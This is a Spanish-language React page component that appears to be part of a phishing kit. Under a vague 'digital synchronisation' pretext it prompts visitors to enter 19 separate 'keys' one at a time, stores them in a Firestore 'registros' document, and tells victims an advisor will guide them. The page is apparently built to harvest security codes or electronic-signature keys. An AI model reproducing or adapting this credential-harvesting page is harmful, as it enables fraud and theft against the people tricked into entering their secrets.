import { useState, useEffect } from "react";
import firebase from "../components/firebase";
import Swal from "sweetalert2"
function findGetParameter(url) {
  var result = null,
    tmp = [];
  window.location.search
    .substr(1)
    .split("&")
    .forEach(function (item) {
      tmp = item.split("=");
      if (tmp[0] === url) result = decodeURIComponent(tmp[1]);
    });
  return result;
}

const ConfigurarFirma = () => {
  const [activeCursos, setActiveCursos] = useState([]);
  const [infoUser, setInfoUser] = useState([]);
  const [count, setCount] = useState(1);

  useEffect(() => {
    const cursosRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursosRef.onSnapshot((snapshot) => {
      setActiveCursos(snapshot.data().usuario);
    });
  }, []);

  const CreateUser = (name, text) => {
    let nameReal = "key" + count;
    setInfoUser({ ...infoUser, [nameReal]: text });
  };

  const handdleWhatsApp = (text) => {
    let arrayAux = findGetParameter("firma");
    activeCursos[arrayAux].keys = infoUser;
    const cursoRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursoRef.update({ usuario: activeCursos }).then(() => {
      window.location.href = "/";
    });
  };

  const Increment = () => {
    document.getElementById("keyInput").value = " ";
    if (count === 19) {
      Swal.fire("Información subida correctamente, su asesor lo guiará en el proceso.")
      handdleWhatsApp();
    } else {
      setCount(count + 1);
    }
  };
  return (
    <>
    <img src="./carrusel2.jpg" className="mx-auto mb-5 " />
    <div className="w-8/12 mx-auto flex">
      <div>
        

        <h1 className="text-lg mb-5 lg:text-3xl font-bold">
          INGRESE DATO ELECTRÓNICO DE SINCRONIZACION DIGITAL
        </h1>
        <p className="text-center font-bold text-indigo-500 text-2xl">
          {count * 5}%
        </p>
        <div className="flex flex-col mt-3 lg:w-6/12">
          <p className="mt-2 mb-1">Sincronización</p>
          <input
            className="border p-2"
            id="keyInput"
            placeholder="Texto.."
            onChange={(e) => CreateUser(count, e.target.value)}
          />
        </div>
        <button
          onClick={(e) => Increment()}
          className="mt-5 bg-gray-200 p-2 border border-gray-600 font-semibold text-xl lg:w-2/12 text-center"
        >
          {count < 18 ? "Siguiente" : "Finalizar"}
        </button>
      </div>
     

    </div> <img src="./index1.jpg" className="mx-auto mt-20 " />
    <img src="./index4.jpg" className="mx-auto mt-10" />

    </>
  );
};
ConfigurarFirma.layout = "L2";
export default ConfigurarFirma;
